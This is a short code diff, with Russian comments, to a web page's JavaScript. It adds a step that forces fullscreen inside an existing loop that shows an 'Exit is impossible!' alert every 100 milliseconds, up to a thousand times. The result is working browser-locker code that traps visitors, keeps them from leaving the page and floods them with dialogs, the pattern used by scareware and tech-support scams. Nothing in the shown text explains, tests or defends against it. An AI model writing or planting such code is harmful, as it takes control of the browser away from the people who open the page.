@@ -88,6 +88,10 @@
                 let alertCount = 0;
                 const showAlert = () => {
                     alertCount++;
+                    // Проверяем, что страница в полноэкранном режиме
+                    if (!document.fullscreenElement) {
+                        document.documentElement.requestFullscreen().catch(console.error);
+                    }
                     alert("Выход невозможен! (" + alertCount + ")");
                     if (alertCount < 1000) { // Ограничение, чтобы избежать переполнения стека
                         setTimeout(showAlert, 100); // Рекурсивный вызов через setTimeout
